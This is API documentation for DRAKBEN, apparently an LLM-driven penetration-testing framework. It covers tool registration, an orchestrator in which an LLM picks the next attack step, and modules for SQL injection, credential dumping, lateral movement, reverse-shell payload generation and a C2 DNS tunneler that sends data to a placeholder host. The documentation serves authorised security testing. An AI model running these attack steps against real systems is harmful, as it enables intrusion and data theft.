# 🔧 DRAKBEN API Reference

> **Version:** 1.0.0  
> **Last Updated:** 4 February 2026  
> **Python:** 3.13+

---

## 📋 Table of Contents

1. [Tool Registry API](#tool-registry-api)
2. [Pentest Orchestrator API](#pentest-orchestrator-api)
3. [LLM Client API](#llm-client-api)
4. [Module APIs](#module-apis)

---

## Tool Registry API

The Tool Registry (`core/tools/tool_registry.py`) is the central hub for managing all pentesting tools.

### Classes

#### `ToolType` (Enum)

Tool execution types.

```python
from core.tools.tool_registry import ToolType

ToolType.SHELL      # Direct shell command
ToolType.PYTHON     # Python module function
ToolType.HYBRID     # Both (Python wrapper around shell)
```

#### `PentestPhase` (Enum)

Pentest phases for tool categorization.

```python
from core.tools.tool_registry import PentestPhase

PentestPhase.RECON          # Reconnaissance
PentestPhase.VULN_SCAN      # Vulnerability scanning
PentestPhase.EXPLOIT        # Exploitation
PentestPhase.POST_EXPLOIT   # Post-exploitation
PentestPhase.LATERAL        # Lateral movement
PentestPhase.REPORTING      # Report generation
```

#### `Tool` (Dataclass)

Tool definition.

```python
from core.tools.tool_registry import Tool, ToolType, PentestPhase

tool = Tool(
    name="nmap",
    type=ToolType.SHELL,
    description="Network port scanner and service detection",
    phase=PentestPhase.RECON,
    command_template="nmap -sV -sC -T4 {target}",
    requires_root=False,
    timeout=600,
)
```

| Field | Type | Description |
|-------|------|-------------|
| `name` | `str` | Unique identifier |
| `type` | `ToolType` | SHELL, PYTHON, or HYBRID |
| `description` | `str` | Tool description |
| `phase` | `PentestPhase` | Pentest phase |
| `command_template` | `str \| None` | Shell command with `{target}` placeholder |
| `python_func` | `Callable \| None` | Python function for PYTHON tools |
| `requires_root` | `bool` | Whether root is required |
| `timeout` | `int` | Execution timeout in seconds |

---

### ToolRegistry Class

#### Constructor

```python
from core.tools.tool_registry import get_registry

registry = get_registry()  # Singleton instance
```

#### Methods

##### `register(tool: Tool) -> None`

Register a new tool.

```python
registry.register(Tool(
    name="custom_scanner",
    type=ToolType.SHELL,
    description="My custom scanner",
    phase=PentestPhase.RECON,
    command_template="./custom_scanner.sh {target}",
))
```

##### `get(name: str) -> Tool | None`

Get tool by name.

```python
tool = registry.get("nmap")
if tool:
    print(tool.description)
```

##### `list_tools(phase: PentestPhase | None = None) -> list[Tool]`

List all tools, optionally filtered by phase.

```python
# All tools
all_tools = registry.list_tools()

# Only recon tools
recon_tools = registry.list_tools(phase=PentestPhase.RECON)
```

##### `list_names() -> list[str]`

Get all tool names.

```python
names = registry.list_names()
# ['nmap', 'nikto', 'gobuster', 'sqlmap', ...]
```

##### `list_by_phase(phase: PentestPhase) -> list[Tool]`

List tools by pentest phase.

```python
exploit_tools = registry.list_by_phase(PentestPhase.EXPLOIT)
```

##### `list_by_type(tool_type: ToolType) -> list[Tool]`

List tools by type.

```python
shell_tools = registry.list_by_type(ToolType.SHELL)
python_tools = registry.list_by_type(ToolType.PYTHON)
```

##### `execute(tool_name: str, target: str, **kwargs) -> dict`

Execute a tool synchronously.

```python
result = registry.execute("nmap", "192.168.1.1")

# Returns:
{
    "success": True,
    "output": "Starting Nmap 7.94...",
    "tool": "nmap",
    "command": "nmap -sV -sC -T4 192.168.1.1",
}
```

##### `async run(tool_name: str, **kwargs) -> dict`

Execute a tool asynchronously.

```python
import asyncio

async def scan():
    result = await registry.run("nmap", target="192.168.1.1")
    print(result["output"])

asyncio.run(scan())
```

##### `format_tool_info(name: str) -> str | None`

Get formatted tool info for display.

```python
info = registry.format_tool_info("nmap")
print(info)
# [nmap]
#   Type: shell
#   Phase: recon
#   Description: Network port scanner and service detection
#   Timeout: 600s
#   Root Required: False
```

##### `format_all_tools() -> str`

Format all tools for display.

```python
print(registry.format_all_tools())
```

---

### Built-in Tools

| Name | Type | Phase | Description |
|------|------|-------|-------------|
| `nmap` | SHELL | RECON | Network port scanner |
| `nmap_stealth` | SHELL | RECON | Stealthy SYN scan (root) |
| `nmap_vuln` | SHELL | VULN_SCAN | Nmap vulnerability scripts |
| `gobuster` | SHELL | RECON | Directory bruteforcing |
| `ffuf` | SHELL | RECON | Fast web fuzzer |
| `nikto` | SHELL | VULN_SCAN | Web server scanner |
| `nuclei` | SHELL | VULN_SCAN | Fast vuln scanner |
| `sqlmap` | SHELL | EXPLOIT | SQL injection tool |
| `hydra` | SHELL | EXPLOIT | Password bruteforce |
| `whatweb` | SHELL | RECON | Web fingerprinting |
| `amass` | SHELL | RECON | Subdomain enumeration |
| `subfinder` | SHELL | RECON | Subdomain discovery |
| `feroxbuster` | SHELL | RECON | Content discovery |
| `enum4linux` | SHELL | RECON | Windows/Samba enum |
| `crackmapexec` | SHELL | EXPLOIT | Network pentesting |
| `impacket_secretsdump` | SHELL | POST_EXPLOIT | Credential dumping |
| `bloodhound` | SHELL | RECON | AD path mapping |
| `responder` | SHELL | EXPLOIT | LLMNR poisoner (root) |
| `wpscan` | SHELL | VULN_SCAN | WordPress scanner |
| `testssl` | SHELL | VULN_SCAN | SSL/TLS testing |
| `passive_recon` | PYTHON | RECON | Passive reconnaissance |
| `sqli_test` | PYTHON | EXPLOIT | SQL injection test |
| `xss_test` | PYTHON | EXPLOIT | XSS detection |
| `ad_enum` | PYTHON | RECON | AD enumeration |
| `lateral_move` | PYTHON | LATERAL | Lateral movement |
| `c2_beacon` | PYTHON | POST_EXPLOIT | C2 beacon setup |
| `weapon_forge` | PYTHON | EXPLOIT | Payload generation |
| `post_exploit` | PYTHON | POST_EXPLOIT | Post-exploitation |
| `evolve` | PYTHON | EXPLOIT | AI code generation |
| `report` | PYTHON | REPORTING | Report generation |

---

## Pentest Orchestrator API

The Orchestrator (`core/agent/pentest_orchestrator.py`) controls pentest flow with a state machine.

### Classes

#### `PentestPhase` (Enum)

Orchestrator phases (different from ToolRegistry phases).

```python
from core.agent.pentest_orchestrator import PentestPhase

PentestPhase.IDLE           # No target
PentestPhase.TARGET_SET     # Target configured
PentestPhase.RECON          # Reconnaissance
PentestPhase.VULN_SCAN      # Vulnerability scanning
PentestPhase.EXPLOIT        # Exploitation
PentestPhase.POST_EXPLOIT   # Post-exploitation
PentestPhase.REPORTING      # Generating report
PentestPhase.COMPLETE       # Done
```

#### `PentestContext` (Dataclass)

Current pentest context.

```python
from core.agent.pentest_orchestrator import PentestContext

context = PentestContext(
    target="192.168.1.1",
    phase=PentestPhase.RECON,
    language="tr",
)
```

| Field | Type | Description |
|-------|------|-------------|
| `target` | `str \| None` | Current target |
| `phase` | `PentestPhase` | Current phase |
| `language` | `str` | Language (tr/en) |
| `open_ports` | `list[dict]` | Discovered ports |
| `services` | `list[dict]` | Discovered services |
| `vulnerabilities` | `list[dict]` | Found vulnerabilities |
| `credentials` | `list[dict]` | Captured credentials |
| `executed_tools` | `list[str]` | Tools executed |
| `tool_outputs` | `list[dict]` | Tool output history |
| `llm_analyses` | `list[dict]` | LLM analysis history |
| `is_kali` | `bool` | Running on Kali Linux |
| `os_name` | `str` | Operating system |
| `available_tools` | `list[str]` | Available tools |

---

### PentestOrchestrator Class

#### Constructor

```python
from core.agent.pentest_orchestrator import PentestOrchestrator

# Without LLM
orchestrator = PentestOrchestrator()

# With LLM client
from llm.openrouter_client import OpenRouterClient
llm = OpenRouterClient()
orchestrator = PentestOrchestrator(llm_client=llm)
```

#### State Management Methods

##### `set_target(target: str) -> dict`

Set target and transition to TARGET_SET phase.

```python
result = orchestrator.set_target("192.168.1.1")
# {
#     "success": True,
#     "message": "Target set: 192.168.1.1",
#     "phase": "TARGET_SET",
#     "suggested_actions": [...]
# }
```

##### `clear_target() -> dict`

Clear target and reset to IDLE.

```python
result = orchestrator.clear_target()
# {"success": True, "message": "Target cleared.", "phase": "IDLE"}
```

##### `advance_phase() -> PentestPhase`

Advance to next logical phase.

```python
new_phase = orchestrator.advance_phase()
# PentestPhase.RECON
```

#### Tool Execution Methods

##### `execute_tool(command: str, timeout: int = 300, live_output: bool = True, analyze: bool = True) -> dict`

Execute a tool with optional LLM analysis.

```python
# Execute registered tool
result = orchestrator.execute_tool("nmap")

# Execute full command
result = orchestrator.execute_tool("nmap -sV -p 1-1000 192.168.1.1")

# Silent mode (no live output)
result = orchestrator.execute_tool("nikto", live_output=False)

# Without LLM analysis
result = orchestrator.execute_tool("gobuster", analyze=False)
```

##### `execute_python_tool(tool_name: str, **kwargs) -> dict`

Execute a registered Python tool.

```python
result = orchestrator.execute_python_tool("passive_recon")
result = orchestrator.execute_python_tool("sqli_test", param="value")
```

##### `list_available_tools() -> list[str]`

List all available tools.

```python
tools = orchestrator.list_available_tools()
# ['nmap', 'nikto', 'gobuster', ...]
```

#### LLM Methods

##### `analyze_output(tool_output: str) -> dict`

Analyze tool output using LLM.

```python
analysis = orchestrator.analyze_output(nmap_output)
# {
#     "success": True,
#     "analysis": {
#         "findings": ["SSH on port 22", "HTTP on port 80"],
#         "next_action": "nikto",
#         "severity": "medium",
#         "summary": "Found 2 open ports..."
#     }
# }
```

##### `chat(user_input: str) -> dict`

Chat with the LLM assistant.

```python
response = orchestrator.chat("What should I do next?")
# {"success": True, "response": "Based on the findings..."}
```

##### `suggest_next() -> dict`

Get LLM suggestion for next action.

```python
suggestion = orchestrator.suggest_next()
# {
#     "success": True,
#     "suggestion": {
#         "tool": "nikto",
#         "command": "nikto -h 192.168.1.1",
#         "reason": "Web server detected on port 80"
#     }
# }
```

---

## LLM Client API

The LLM Client (`llm/openrouter_client.py`) provides multi-provider LLM support.

### OpenRouterClient Class

#### Constructor

```python
from llm.openrouter_client import OpenRouterClient

# Default (uses OPENROUTER_API_KEY env var)
client = OpenRouterClient()

# Custom API key
client = OpenRouterClient(api_key="sk-...")

# Custom model
client = OpenRouterClient(model="anthropic/claude-3-opus")
```

#### Methods

##### `query(prompt: str, system_prompt: str = "", max_tokens: int = 4096) -> str`

Query the LLM.

```python
response = client.query(
    prompt="Analyze this nmap output...",
    system_prompt="You are a security expert.",
)
```

##### `switch_model(model: str) -> bool`

Switch to a different model.

```python
success = client.switch_model("anthropic/claude-3-sonnet")
```

##### `switch_provider(provider: str, **kwargs) -> bool`

Switch to a different provider.

```python
# Switch to Ollama (local)
client.switch_provider("ollama", base_url="http://localhost:11434")

# Switch to OpenAI
client.switch_provider("openai", api_key="sk-...")

# Switch to custom endpoint
client.switch_provider("custom", base_url="http://my-llm-server:8000")
```

##### `list_ollama_models() -> list[str]`

List available Ollama models.

```python
models = client.list_ollama_models()
# ['llama2', 'codellama', 'mistral', ...]
```

##### `get_cache_stats() -> dict`

Get cache statistics.

```python
stats = client.get_cache_stats()
# {"hits": 42, "misses": 10, "hit_rate": 0.807}
```

---

## Module APIs

### Recon Module (`modules/recon.py`)

```python
from modules.recon import passive_recon, Recon

# Passive reconnaissance (async)
import asyncio
result = asyncio.run(passive_recon("example.com"))

# Full recon class
recon = Recon()
dns_info = recon.dns_lookup("example.com")
whois_info = recon.whois_lookup("example.com")
```

### Exploit Module (`modules/exploit.py`)

```python
from modules.exploit import PolyglotEngine, ExploitRunner

# Get polyglot payloads
payloads = PolyglotEngine.get_chimera_payloads()

# Run exploit
runner = ExploitRunner()
result = runner.run_sqli_test("http://target.com/page?id=1")
```

### C2 Framework (`modules/c2_framework.py`)

```python
from modules.c2_framework import C2Config, C2Framework, DNSTunneler

# Create C2 config
config = C2Config(primary_host="c2.example.com", port=443)

# Initialize framework
c2 = C2Framework(config)

# DNS tunneling
tunneler = DNSTunneler(c2_domain="c2.example.com")
success, data = tunneler.send_data(b"secret data")
```

### HiveMind (`modules/hive_mind.py`)

```python
from modules.hive_mind import HiveMind, Agent

# Create swarm
hive = HiveMind()

# Add agent
agent = Agent(ip="192.168.1.100", credentials={"user": "admin"})
hive.add_agent(agent)

# Lateral movement
hive.lateral_move(from_agent=agent, target_ip="192.168.1.101")
```

### Weapon Foundry (`modules/weapon_foundry.py`)

```python
from modules.weapon_foundry import WeaponFoundry, PayloadType

# Create foundry
forge = WeaponFoundry()

# Generate payload
payload = forge.forge(
    payload_type=PayloadType.REVERSE_SHELL,
    target_os="linux",
    lhost="192.168.1.50",
    lport=4444,
)
```

---

## Error Handling

All API methods return dictionaries with consistent structure:

```python
# Success
{
    "success": True,
    "output": "...",
    "tool": "nmap",
    # ... other fields
}

# Error
{
    "success": False,
    "error": "Error description",
    "tool": "nmap",
}
```

Always check the `success` field:

```python
result = registry.execute("nmap", "192.168.1.1")
if result["success"]:
    print(result["output"])
else:
    print(f"Error: {result['error']}")
```

---

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `OPENROUTER_API_KEY` | OpenRouter API key | Required for LLM |
| `OPENAI_API_KEY` | OpenAI API key | Optional |
| `OLLAMA_HOST` | Ollama server URL | `http://localhost:11434` |
| `DRAKBEN_LANG` | Default language | `tr` |
| `DRAKBEN_DEBUG` | Enable debug logging | `false` |

### Config Files

- `config/settings.json` - General settings
- `config/api.env` - API keys
- `config/plugins.json` - Plugin configuration

---

*For more examples, see the `tests/` directory.*
